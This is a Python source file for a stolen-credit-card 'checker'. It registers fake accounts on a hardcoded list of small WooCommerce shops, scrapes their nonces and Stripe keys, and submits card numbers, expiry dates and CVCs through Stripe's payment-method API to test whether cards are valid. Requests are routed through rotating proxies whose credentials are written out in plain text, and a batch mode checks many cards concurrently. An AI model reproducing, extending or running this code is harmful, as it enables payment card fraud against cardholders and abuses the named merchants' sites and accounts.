import sys
import os
import asyncio
import re
import json
import random
import uuid
import warnings
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import aiohttp
from fake_useragent import UserAgent

# Fix encoding for Windows terminal
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

warnings.filterwarnings("ignore")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY CONFIGURATION (from stripe.py - converted to HTTPS format)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PROXIES_LIST = [
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@co-bog.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080',
    'http://OR1673915314:LMf4JcDV@208.196.99.128:8813',
    'http://naveed:Qwerty_123ABC@196.244.48.124:12345'
]

# Convert to HTTPS format (if needed, or keep as HTTP - aiohttp handles both)
PROXIES_HTTPS = [
    f"http://{proxy.split('://')[1]}" if '://' in proxy else f"http://{proxy}" 
    for proxy in PROXIES_LIST
]

# User Agents for rotation (from stripe.py)
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9RT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

# First names for billing (from stripe.py)
FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph",
    "Thomas", "Christopher", "Charles", "Daniel", "Matthew", "Anthony", "Mark",
    "Donald", "Steven", "Andrew", "Paul", "Joshua", "Kenneth", "Kevin", "Brian",
    "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan",
    "Jessica", "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra",
    "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle", "Carol",
]

# Last names for billing (from stripe.py)
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
    "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson",
    "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson",
    "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen",
]

# HARDCODED SITES
MAU_SITES = [
    #"shop-caymans.com",
    #"shop.conequipmentparts.com",
    #"sababa-shop.com",
    #"mjuniqueclosets.com",
    #"dutchwaregear.com",
    #"nielladiverse.com",
    #"grabpick.com",
    "dominileather.com",
    #"uchangellc.com",
    #"salthilljewelry.com",
    #"theneomag.com",
    #"bdmanja.com",
    #"shop.littlefeetdenver.com",
    #"zoe-hermsen.com",
    #"saadaintl.com",
    #"sockbox.com",
    #"exquisitebeds.com",
    "girlslivingwell.com",
    #"shop.wattlogic.com",
    "clinetix-xvps.temp-dns.com",
    #"courtneyreckord.com",
    #"beatrizpalacios.com",
    #"peeteescollection.com",
    #"2poundstreet.com",
    #"prettyplainpaper.com",
    #"lolaandveranda.com",
    #"kgmarket.kg",
    #"www.poggio.cc",
    #"onlinefixings.co.uk",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPER FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_random_proxy():
    """Return a random proxy from the list"""
    return random.choice(PROXIES_LIST) if PROXIES_LIST else None

def get_random_user_agent():
    """Return a random user agent"""
    return random.choice(USER_AGENTS)

def get_random_billing_name():
    """Generate random billing name"""
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def parse_card_data(card_string):
    try:
        card_string = card_string.replace(' ', '')
        if '|' in card_string:
            parts = card_string.split('|')
            if len(parts) >= 4:
                return {
                    'number': parts[0],
                    'exp_month': parts[1],
                    'exp_year': parts[2][-2:] if len(parts[2]) == 4 else parts[2],
                    'cvc': parts[3].strip()
                }
        return None
    except: 
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def normalize_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    url = url.rstrip('/')
    if '/my-account' not in url.lower():
        url += '/my-account'
    if not url.endswith('/'):
        url += '/'
    return url

def generate_guid():
    return str(uuid.uuid4())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ENHANCED EXTRACTION FUNCTIONS (from app.py)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def extract_wordpress_nonce(html_content, nonce_type='all'):
    """
    Enhanced nonce extraction from WordPress/WooCommerce pages
    Supports multiple nonce types and patterns
    """
    patterns = {
        'woocommerce_register': [
            r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
            r'woocommerce-register-nonce["\']?:\s*["\']([^"\']+)["\']',
            r'id="woocommerce-register-nonce" value="([^"]+)"'
        ],
        'stripe_setup': [
            r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
            r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
            r'wc_stripe_payment_method_params\.createAndConfirmSetupIntentNonce\s*=\s*"([^"]+)"',
            r'add_card_nonce["\']?:\s*["\']([^"\']+)["\']',
            r'name="add_payment_method_nonce"\s+value="([^"]+)"',
            r'wc_stripe_add_payment_method_nonce["\']?:\s*["\']([^"\']+)["\']'
        ],
        'wordpress_ajax': [
            r'name=["\']_ajax_nonce["\'][^>]*value="([^"]+)"',
            r'var ajax_nonce = "([^"]+)"',
            r'wp_rest["\']?:\s*{[^}]*"nonce":"([^"]+)"'
        ],
        'wordpress_action': [
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'_wpnonce["\']?:\s*["\']([^"\']+)["\']',
            r'woocommerce-login-nonce["\']?:\s*["\']([^"\']+)["\']'
        ]
    }
    
    patterns_to_check = []
    if nonce_type == 'all':
        for p in patterns.values():
            patterns_to_check.extend(p)
    else:
        patterns_to_check.extend(patterns.get(nonce_type, []))
    
    # Also check for nonce in meta tags
    meta_patterns = [
        r'<meta name="nonce" content="([^"]+)"',
        r'<meta name="wp-nonce" content="([^"]+)"'
    ]
    patterns_to_check.extend(meta_patterns)
    
    # Check for nonce in JavaScript variables
    js_patterns = [
        r'registerNonce["\']?\s*:\s*["\']([^"\']+)["\']',
        r'wc_register_nonce["\']?\s*=\s*["\']([^"\']+)["\']',
        r'nonce["\']?\s*:\s*["\']([^"\']+)["\']'
    ]
    patterns_to_check.extend(js_patterns)
    
    for pattern in patterns_to_check:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            return match.group(1)
    
    return None


def extract_stripe_key_enhanced(html_content):
    """
    Enhanced Stripe public key extraction with multiple patterns
    """
    patterns = [
        r'pk_(live|test)_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_(live|test)_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_(live|test)_[^"]+)"',
        r'"publishableKey":"(pk_(live|test)_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_(live|test)_[^\'"]+))[\'"]',
        r'Stripe\(\'((pk_(live|test)_[a-zA-Z0-9_]+))\'\)',
        r'stripe_key[\'"]?\s*:\s*[\'"](pk_(live|test)_[^\'"]+)[\'"]',
        r'key[\'"]?\s*:\s*[\'"](pk_(live|test)_[a-zA-Z0-9_]+)[\'"]',
        r'data-key="(pk_(live|test)_[^"]+)"',
        r'publishable_key["\']?\s*:\s*["\'](pk_(live|test)_[^"\']+)["\']',
        r'stripePublishableKey["\']?\s*:\s*["\'](pk_(live|test)_[^"\']+)["\']'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, html_content)
        for match in matches:
            if isinstance(match, tuple):
                key = match[0] if match[0] else match
            else:
                key = match
            if key and ('pk_live_' in key or 'pk_test_' in key):
                return key
    
    return None


async def enhanced_get_stripe_key(session, domain, proxy=None):
    """
    Enhanced Stripe key retrieval from multiple endpoints
    """
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params",
        f"https://{domain}/wp-json/wc-stripe/v1/stripe_params",
        f"https://{domain}/cart/",
        f"https://{domain}/"
    ]
    
    user_agent = get_random_user_agent()
    headers = {'user-agent': user_agent}
    
    for url in urls_to_try:
        try:
            async with session.get(url, headers=headers, proxy=proxy, ssl=False) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    key = extract_stripe_key_enhanced(text)
                    if key:
                        return key
        except:
            continue
    
    return None


def detect_platform_enhanced(html_content):
    """
    Detect if site is WordPress, WooCommerce, or both
    """
    is_wordpress = 'wp-content' in html_content or 'wp-includes' in html_content
    is_woocommerce = 'woocommerce' in html_content.lower() or '/wp-content/plugins/woocommerce/' in html_content
    
    if is_woocommerce:
        return "woocommerce"
    elif is_wordpress:
        return "wordpress"
    return "unknown"


def generate_enhanced_credentials():
    """
    Generate random but realistic user credentials
    """
    import string
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@{random.choice(['gmail.com', 'outlook.com', 'yahoo.com', 'protonmail.com'])}"
    password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=14))
    first_name = random.choice(FIRST_NAMES)
    last_name = random.choice(LAST_NAMES)
    
    return {
        'username': username,
        'email': email,
        'password': password,
        'first_name': first_name,
        'last_name': last_name
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN ASYNC LOGIC WITH PROXY SUPPORT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_stripe_card(base_url, card_data, auth_mode=1, proxy=None):
    """
    Process stripe card with optional proxy support
    """
    user_agent = get_random_user_agent()
    
    try:
        if not base_url.startswith('http'):
            base_url = 'https://' + base_url
            
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            domain_host = parsed.netloc
            email = generate_random_email()
            
            # Auth Mode 1: Register
            if auth_mode == 1:
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'user-agent': user_agent,
                }
                
                try:
                    resp = await session.get(base_url, headers=headers, proxy=proxy, ssl=False)
                    resp_text = await resp.text()
                except (aiohttp.ClientProxyConnectionError, aiohttp.ClientHttpProxyError):
                    # Try without proxy if proxy fails
                    resp = await session.get(base_url, headers=headers, ssl=False)
                    resp_text = await resp.text()
                
                # Use enhanced nonce extraction first
                register_nonce = extract_wordpress_nonce(resp_text, 'woocommerce_register')
                
                # Fallback to original gets() if enhanced fails
                if not register_nonce:
                    register_nonce = (
                        gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
                        gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or
                        gets(resp_text, 'name="woocommerce-register-nonce" value="', '"')
                    )
                
                if register_nonce:
                    # Use enhanced credential generation
                    creds = generate_enhanced_credentials()
                    username = creds['username']
                    password = creds['password']
                    
                    # Detect platform for better registration
                    platform = detect_platform_enhanced(resp_text)
                    
                    register_data = {
                        'email': creds['email'],
                        'username': username,
                        'password': password,
                        'confirm_password': password,
                        'first_name': creds['first_name'],
                        'last_name': creds['last_name'],
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': base_url,
                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'wc_order_attribution_session_pages': '1',
                        'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': headers['user-agent'],
                        'woocommerce-register-nonce': register_nonce,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                        'terms': '1'
                    }
                    
                    # Adjust for non-WooCommerce WordPress
                    if platform == 'wordpress':
                        register_data = {
                            'user_login': username,
                            'user_email': creds['email'],
                            'user_pass': password,
                            'confirm_user_pass': password,
                            'first_name': creds['first_name'],
                            'last_name': creds['last_name'],
                            '_wpnonce': register_nonce,
                            '_wp_http_referer': '/wp-login.php?action=register',
                            'wp-submit': 'Register'
                        }
                    
                    try:
                        reg_resp = await session.post(base_url, headers=headers, data=register_data, proxy=proxy, ssl=False)
                        reg_text = await reg_resp.text()
                    except:
                        reg_resp = await session.post(base_url, headers=headers, data=register_data, ssl=False)
                        reg_text = await reg_resp.text()
                    
                    if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                        try:
                            resp = await session.get(base_url, headers=headers, proxy=proxy, ssl=False)
                            resp_text = await resp.text()
                        except:
                            resp = await session.get(base_url, headers=headers, ssl=False)
                            resp_text = await resp.text()
                        
                        # Use enhanced nonce extraction for login
                        login_nonce = extract_wordpress_nonce(resp_text, 'wordpress_action')
                        
                        if not login_nonce:
                            login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                        
                        if login_nonce:
                            login_data = {
                                'username': username, 
                                'password': password, 
                                'woocommerce-login-nonce': login_nonce, 
                                'login': 'Log in'
                            }
                            try:
                                await session.post(base_url, headers=headers, data=login_data, proxy=proxy, ssl=False)
                            except:
                                await session.post(base_url, headers=headers, data=login_data, ssl=False)

            # Prepare Payment Page
            add_payment_url = base_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                 add_payment_url = f"{domain}/my-account/add-payment-method/"

            headers = {'user-agent': user_agent}
            
            try:
                resp = await session.get(add_payment_url, headers=headers, proxy=proxy, ssl=False)
                payment_page_text = await resp.text()
            except:
                resp = await session.get(add_payment_url, headers=headers, ssl=False)
                payment_page_text = await resp.text()
            
            # Extract Nonces - using enhanced extraction first
            add_card_nonce = extract_wordpress_nonce(payment_page_text, 'stripe_setup')
            
            # Fallback to original gets() if enhanced fails
            if not add_card_nonce:
                add_card_nonce = (
                    gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
                    gets(payment_page_text, 'add_card_nonce":"', '"') or
                    gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or
                    gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"')
                )
            
            # Extract Stripe Key - using enhanced extraction
            stripe_key = extract_stripe_key_enhanced(payment_page_text)
            
            # Fallback to original extraction methods
            if not stripe_key:
                stripe_key = (
                    gets(payment_page_text, '"key":"pk_', '"') or
                    gets(payment_page_text, 'data-key="pk_', '"') or
                    gets(payment_page_text, 'stripe_key":"pk_', '"') or
                    gets(payment_page_text, 'publishable_key":"pk_', '"')
                )
            
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match: stripe_key = pk_match.group(0)
            
            # If still no key, try enhanced retrieval from other endpoints
            if not stripe_key:
                stripe_key = await enhanced_get_stripe_key(session, domain_host, proxy)
            
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key

            # Stripe API Request
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': user_agent
            }
            
            # Enhanced billing details
            billing_postal = ''.join(random.choices('0123456789', k=5))
            billing_name = get_random_billing_name()
            
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': random.choice(['US', 'AU', 'GB', 'CA']),
                'billing_details[address][postal_code]': billing_postal,
                'billing_details[name]': billing_name,
                'pasted_fields': 'number',
                'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
                'referrer': domain,
                'time_on_page': str(random.randint(1000, 50000)),
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(), 
                'muid': generate_guid(), 
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20',
            }
            
            try:
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy, ssl=False)
                pm_json = await pm_resp.json()
            except:
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, ssl=False)
                pm_json = await pm_resp.json()
            
            if 'error' in pm_json:
                return False, pm_json['error']['message']
                
            pm_id = pm_json.get('id')
            if not pm_id: 
                return False, "Failed to create Payment Method"
            
            # Confirm on Site - Enhanced with multiple endpoint attempts
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': user_agent
            }
            
            # Enhanced endpoints list with more options
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_setup_intent', 'payment_method_id': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_attach_payment_method', 'payment_method_id': pm_id}},
                {'url': f"{domain}/?wc-ajax=create_setup_intent", 'data': {'payment_method_id': pm_id}},
            ]
            
            for endp in endpoints:
                if not add_card_nonce: 
                    # Try to extract nonce again from different source
                    add_card_nonce = extract_wordpress_nonce(payment_page_text, 'stripe_setup')
                    if not add_card_nonce:
                        continue

                # Add nonce to appropriate field
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                
                endp['data']['wc-stripe-payment-type'] = 'card'
                
                try:
                    try:
                        res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy, ssl=False)
                        text = await res.text()
                    except:
                        res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, ssl=False)
                        text = await res.text()
                    
                    # Enhanced response parsing
                    if 'success' in text.lower():
                        try:
                            js = json.loads(text)
                            if js.get('success'):
                                status = js.get('data', {}).get('status', '')
                                
                                if status == 'succeeded': 
                                    return True, "Payment Method Added"
                                
                                if status == 'requires_action':
                                    return False, "Your card was declined. (Status: requires_action - 3DS Required)"
                                
                                if status == 'requires_confirmation':
                                    return True, "Payment method added successfully"
                                
                                return True, f"Approved (Status: {status})"
                            else:
                                error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                                # Check for specific decline reasons
                                if 'insufficient_funds' in error_msg.lower():
                                    error_msg = "Insufficient funds"
                                elif 'card_declined' in error_msg.lower():
                                    error_msg = "Card declined by issuer"
                                elif 'incorrect_cvc' in error_msg.lower():
                                    error_msg = "Incorrect CVV"
                                elif 'expired_card' in error_msg.lower():
                                    error_msg = "Card expired"
                                return False, error_msg
                        except json.JSONDecodeError:
                            # Check if response indicates success without JSON
                            if 'payment method' in text.lower() and ('added' in text.lower() or 'saved' in text.lower()):
                                return True, "Payment method added"
                            return False, "Invalid response from site"
                    elif 'payment method' in text.lower() and ('added' in text.lower() or 'saved' in text.lower()):
                        return True, "Payment method added successfully"
                    elif 'requires_action' in text.lower():
                        return False, "Your card was declined. (3DS Authentication Required)"
                except Exception as e:
                    continue
            
            return False, "Failed to confirm payment method on site"

    except Exception as e:
        return False, f"System Error: {str(e)}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECKING WITH PROXY ROTATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_stripe_auth(card_string, use_proxy=True, max_retries=2):
    """
    Main function to be called from mau.py.
    Loops through sites and processes the card asynchronously with proxy rotation.
    
    Args:
        card_string: Card in format "number|mm|yy|cvv"
        use_proxy: Boolean to enable/disable proxy usage
        max_retries: Number of retries per site if proxy fails
    
    Returns:
        dict with status, response, cc, and site
    """
    card_data = parse_card_data(card_string)
    if not card_data:
        return {"status": "ERROR", "response": "Invalid Card Format"}

    current_sites = MAU_SITES[:] 
    
    # Loop through hardcoded sites
    for site in current_sites:
        full_url = normalize_url(site)
        
        for attempt in range(max_retries):
            proxy = get_random_proxy() if use_proxy and PROXIES_LIST else None
            
            try:
                # Call the async processing logic with proxy
                is_approved, message = await process_stripe_card(full_url, card_data, auth_mode=1, proxy=proxy)
                
                # Determine status
                if is_approved:
                    return {
                        "status": "APPROVED",
                        "response": message,
                        "cc": card_string,
                        "site": site
                    }
                else:
                    # If declined with a specific reason, stop trying other sites
                    # If it's a site error or proxy issue, try next site or retry
                    if "System Error" not in message and "Failed to confirm" not in message and "Connection" not in message:
                        if "proxy" in message.lower() or "connection" in message.lower():
                            # Proxy issue, try again with different proxy
                            continue
                        return {
                            "status": "DECLINED",
                            "response": message,
                            "cc": card_string,
                            "site": site
                        }
                    else:
                        # Site error, try next site
                        break
                        
            except (aiohttp.ClientProxyConnectionError, aiohttp.ClientHttpProxyError) as e:
                print(f"Proxy error on {site} (attempt {attempt + 1}): {e}")
                continue
            except asyncio.TimeoutError:
                print(f"Timeout on {site} (attempt {attempt + 1})")
                continue
            except Exception as e:
                print(f"Error processing on {site} (attempt {attempt + 1}): {e}")
                continue
    
    # If loop finishes without returning
    return {
        "status": "ERROR",
        "response": "All sites failed or timed out",
        "cc": card_string
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BATCH PROCESSING FOR MULTIPLE CARDS (MASS CHECKING)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_batch_cards(card_strings, use_proxy=True, max_concurrent=5):
    """
    Process multiple cards concurrently for mass checking.
    
    Args:
        card_strings: List of card strings in format "number|mm|yy|cvv"
        use_proxy: Boolean to enable/disable proxy usage
        max_concurrent: Maximum number of concurrent checks
    
    Returns:
        List of results for each card
    """
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def process_with_semaphore(card):
        async with semaphore:
            return await process_stripe_auth(card, use_proxy=use_proxy)
    
    tasks = [process_with_semaphore(card) for card in card_strings]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Process results
    processed_results = []
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            processed_results.append({
                "status": "ERROR",
                "response": str(result)[:100],
                "cc": card_strings[i],
                "site": None
            })
        else:
            processed_results.append(result)
    
    return processed_results


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SYNC WRAPPER FOR EASY IMPORT (for non-async environments)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def check_card_sync(card_string, use_proxy=True):
    """
    Synchronous wrapper for process_stripe_auth.
    Use this for non-async environments.
    """
    return asyncio.run(process_stripe_auth(card_string, use_proxy=use_proxy))


def check_batch_sync(card_strings, use_proxy=True, max_concurrent=5):
    """
    Synchronous wrapper for batch processing.
    """
    return asyncio.run(process_batch_cards(card_strings, use_proxy=use_proxy, max_concurrent=max_concurrent))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXAMPLE USAGE (commented out)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    # Single card check
    # result = asyncio.run(process_stripe_auth("4111111111111111|12|26|123"))
    # print(result)
    
    # Batch check multiple cards
    # cards = [
    #     "4111111111111111|12|26|123",
    #     "5555555555554444|12|26|123",
    # ]
    # results = asyncio.run(process_batch_cards(cards))
    # for r in results:
    #     print(r)
    pass